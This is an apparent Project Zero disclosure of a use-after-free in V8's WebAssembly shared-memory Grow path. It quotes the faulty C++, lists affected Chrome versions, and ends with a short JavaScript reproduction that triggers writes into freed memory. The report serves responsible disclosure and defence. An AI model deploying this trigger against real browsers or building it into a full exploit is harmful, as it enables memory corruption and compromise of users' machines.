<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/wasm/wasm-objects.cc?rcl=783343158eb1b147df7e6669f1d03c690c878e21&l=1253
```
int32_t WasmMemoryObject::Grow(Isolate* isolate,
                               Handle<WasmMemoryObject> memory_object,
                               uint32_t pages) {
[...]
  Handle<JSArrayBuffer> new_buffer;
  if (old_buffer->is_shared()) {
    // Adjust protections for the buffer.
    if (!AdjustBufferPermissions(isolate, old_buffer, new_size)) {
      return -1;
    }
    void* backing_store = old_buffer->backing_store();
    if (memory_tracker->IsWasmSharedMemory(backing_store)) {
      // This memory is shared between different isolates.
      DCHECK(old_buffer->is_shared());
      // Update pending grow state, and trigger a grow interrupt on all the
      // isolates that share this buffer.
      memory_tracker->SetPendingUpdateOnGrow(old_buffer, new_size);
      // Handle interrupts for this isolate so that the instances with this
      // isolate are updated.
      isolate->stack_guard()->HandleInterrupts();
      // Failure to allocate, or adjust pemissions already handled here, and
      // updates to instances handled in the interrupt handler safe to return.
      return static_cast<uint32_t>(old_size / wasm::kWasmPageSize);
    }
    // SharedArrayBuffer, but not shared across isolates. Setup a new buffer
    // with updated permissions and update the instances.
    new_buffer =
        wasm::SetupArrayBuffer(isolate, backing_store, new_size, // ***1***
                               old_buffer->is_external(), SharedFlag::kShared);
    memory_object->update_instances(isolate, new_buffer);
[...]
```

When `Grow` is called on a `WebAssembly.Memory` object that's backed by a `SharedArrayBuffer`, it
uses the buffer's backing store pointer to construct a new array buffer[1]. Calling `Detach` on
shared buffers is prohibited by the spec, so the the method just leaves the old one as it is. Thus
two array buffers might end up owning the same backing store, and if one of the them got garbage
collected, the other one would point to a freed memory region.

Blink's SharedArrayBuffer implementation uses reference-counted backing stores, so v8 should
probably implement something similar.

<b>VERSION</b>
Google Chrome 73.0.3683.103 (Official Build) (64-bit) (cohort: Stable)
Chromium 75.0.3758.0 (Developer Build) (64-bit)
This bug affects the stable branch due to the currently active "WebAssembly Threads" Origin Trial.
https://developers.chrome.com/origintrials/#/view_trial/-5026017184145473535

<b>REPRODUCTION CASE</b>
<script>
function gc() {
  for (let i = 0; i < 50; ++i) {
    let buffer = new ArrayBuffer(1024 * 1024);
  }
}

setInterval(() => {
  memory = new WebAssembly.Memory({initial: 1, maximum: 2, shared: true});
  memory.grow(1);
  gc();
  array = new Int8Array(memory.buffer);
  array[0x1337] = 1;
});
</script>

<b>CREDIT INFORMATION</b>
Sergei Glazunov of Google Project Zero

This bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made
broadly available (whichever is earlier), the bug report will become visible to the public.